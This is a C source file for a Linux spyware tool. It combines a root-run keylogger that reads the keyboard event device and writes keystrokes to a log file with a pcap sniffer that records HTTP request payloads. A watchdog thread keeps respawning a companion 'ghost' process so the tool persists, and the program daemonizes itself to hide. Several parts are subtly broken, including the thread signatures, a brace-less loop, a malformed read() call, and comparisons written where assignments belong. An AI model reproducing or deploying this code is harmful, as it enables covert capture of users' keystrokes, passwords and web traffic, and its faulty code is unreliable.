#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdlib.h>

#include <pcap.h>

#include <fcntl.h>   //open
#include <string.h>  //strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  //daemon, close
#include <linux/input.h>

#include "key_util.h"
#include "util.h"
#include "config.h"

#include "ip.h"
#include "http.h"
#include "process.h"
#include "timed_logger.h"

#define KEY_RELEASE 0
#define KEY_PRESS 1
#define TCP_PROTOCOL 6

/* TODO: Can these be used in pcap filter */
#define HTTP_PORT 80
#define HTTPS_PORT 443

/* TODO: Uncomment this. static const int PCAP_ERRBUF_SIZE = 100 */

pid_t exec_ghost();
void* keep_ghost_alive(void *args);
void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void* start_keylogging(int kb_fd, FILE *log_file);

int main(int argc, char **argv)
{
    pid_t id = -1;
    if (argc >= 2)
        id = atoi(argv[1]);

    pthread_attr_t attr;
    pthread_attr_init(&attr);

    pthread_t aliver;
    pthread_create(&aliver, &attr, keep_ghost_alive, &id);
    
    pthread_t keylog;
    pthread_create(&keylog, &attr, start_keylogging, &id);

    FILE *network_log = fopen("log/network.txt", "a");
    struct loginfo info = { network_log, NEVER_WRITTEN, 4 };

    /* Variables for pcap sniffing, such as error buffer, device to be read
       and filters, masks, etc. */
    char *dev, errbuf[100];
    pcap_t *handle;
    struct bpf_program filter;
    bpf_u_int32 mask;
    bpf_u_int32 net;

    /* Create the default pcap device and exit if error occurs */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        printf("No default device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Find the netmask for the chosen device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) < 0)
    {
        printf("Can't get netmask for device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Create a handle to start sniffint packets in non promiscuous
       mode. */
    handle = pcap_open_live(dev, 1518, true, 1000, errbuf);
    if (handle == NULL)
    {
        printf("Couldn't open device: %s. Exiting...", errbuf);
        exit(1);
    }

    /* Handle the creation of the filter compilation and installing */
    if (pcap_compile(handle, &filter, "tcp port 80 or tcp port 443", 0, net) < 0)
    {
        printf("Couldn't create filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }

    if (pcap_setfilter(handle, &filter) < 0)
    {
        printf("Couldn't install filter: %s. Exiting...", pcap_geterr(handle));
        exit(1);
    }

    /***KEYLOGGER****/
    /*Check for root privileges*/
    if (geteuid() != 0) {
        printf("Must run as root! Exiting... \n");
        exit(-1);
    }
    
    Config config;
    /*Retrieve keyboard device file*/
    static const char *command =
    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
    "grep -B1 120013 |"
    "grep -Eo event[0-9]+ |"
    "tr '\\n' '\\0'";
    
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Could not determine keyboard device file \nExiting...");
        exit(-1);
    }
    char result[20] = "/dev/input/";
    char temp[9];
    fgets(temp, 9, pipe);
    pclose(pipe);
    config.device_file = strcat(result, temp);
    
    /*Open keyboard device file*/
    int kb_fd = open(config.device_file, O_RDONLY);
    if (kb_fd == -1) {
        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
        exit(-1);
    }
    
    /*Open log file*/
    FILE *log_file = fopen("log/keylog.txt", "a");
    if (log_file == NULL) {
        printf("Could not open log file. \nExiting...");
        exit(-1);
    }
    
    /*Disable buffering to write on every KEY_PRESS*/
    setbuf(log_file, NULL);
    
    pcap_loop(handle, -1, packet_received, (u_char*) &info);
    
    config_cleanup(&config);
    close(kb_fd);
    pcap_freecode(&filter);
    pcap_close(handle);
    pthread_join(aliver, NULL);
    pthread_join(keylog, NULL);
    fclose(network_log);
    fclose(log_file);

    return 0;
}

pid_t exec_ghost()
{
    pid_t parent_id = getpid();
    pid_t id = fork();

    if (id < 0)
    {
        printf("There was an error forking. Exiting...\n");
        exit(1);
    }
    else if (id == 0)
    {
        char str_id[6];
        sprintf(str_id, "%d", parent_id);

        printf("Starting ghost...\n");
        execlp("./ghost", "./ghost", str_id, NULL);
    }

    return id;
}

void* keep_ghost_alive(void *args)
{
    pid_t cur_pid = *((int *) args);
    while(1)
    {
        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_ghost);
        wait(NULL);
    }
}

void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct loginfo *info = (struct loginfo*) args;

    struct ethernet_header *eth;
    struct ip_header *ip;
    struct tcp_header *tcp;
    const u_char *payload;
    u_int p_size;

    if (process_packet(packet, &eth, &ip, &tcp, &payload, &p_size) < 0)
    {
        printf("There was an error processing the packet.");
        exit(1);
    }

    if (p_size > 0)
        if (is_http_request(payload, p_size))
        {
            timestamped_write(info, payload);
            timestamped_write(info, "\n");
        }
}

void* start_keylogging(int kb_fd, FILE *log_file){
    
    typedef struct input_event input_event;
    input_event event;
    int shift_pressed=0; //If shift engaged, shift_pressed = 1
    
    struct loginfo *info;
    
    
    /*Daemonize process by redirecting stdin and stdout to /dev/null*/
    if (daemon(1, 0) == -1) {
        printf("Could not daemonize. \nError: %s. \nExiting...", strerror(errno));
        exit(-1);
    }
    
    while (1)
    read(kb_fd, &event, sizeof(input_event) > 0);
    if (event.type == EV_KEY) {
        if (event.value == KEY_PRESS) {
            if (is_shift(event.code)) {
                shift_pressed == 1;
            }
            char *name = get_key_text(event.code, shift_pressed);
            if (strcmp(name, "\0") != 0) {
                /***TODO - change this to timestamped_write**/
                fprintf(log_file, "%s",name);
            }
        } else if (event.value == KEY_RELEASE) {
            if (is_shift(event.code)) {
                shift_pressed == 0;
            }
        }
    }
}
